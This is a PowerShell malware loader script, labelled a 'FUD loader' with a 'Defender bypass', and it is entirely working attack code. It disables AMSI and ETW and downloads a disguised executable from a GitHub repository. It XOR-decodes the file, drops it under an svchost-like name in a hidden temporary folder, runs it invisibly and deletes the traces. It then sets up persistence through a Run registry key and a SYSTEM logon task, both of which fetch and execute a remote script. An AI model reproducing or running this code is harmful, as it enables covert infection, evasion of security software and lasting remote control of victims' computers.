# VOID-9 $1K FUD LOADER 2026 - DEFENDER BYPASS EDITION
$ErrorActionPreference = 'SilentlyContinue'

# MAX BYPASS CHAIN
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
[Runtime.InteropServices.Marshal]::WriteInt32([Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([Action]$null),0,0)
$etw = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
$etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)

try {
    # Download from GitHub
    $url = "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $data = $wc.DownloadData($url)
    if ($data.Length -lt 1000000) { exit }

    # XOR decrypt
    for($i=0; $i -lt $data.Length; $i++) { $data[$i] = $data[$i] -bxor 0x69 }

    # Random hidden folder + filename
    $rand = Get-Random -Maximum 999999999
    $folder = "$env:TEMP\WinUpdate_$rand"
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
    $exePath = "$folder\svchost_update_$rand.exe"
    [IO.File]::WriteAllBytes($exePath, $data)

    # Run hidden - NO extra arguments (stub already has C2 baked in)
    Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru | Out-Null

    # Self-delete after launch
    Start-Sleep -Seconds 5
    Remove-Item $folder -Recurse -Force -ErrorAction SilentlyContinue

    # Persistence
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdateHelper" -Value "powershell -nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`"" -Force

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`""
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    Register-ScheduledTask -TaskName "WinUpdateHelper" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

    exit
}
catch { exit }
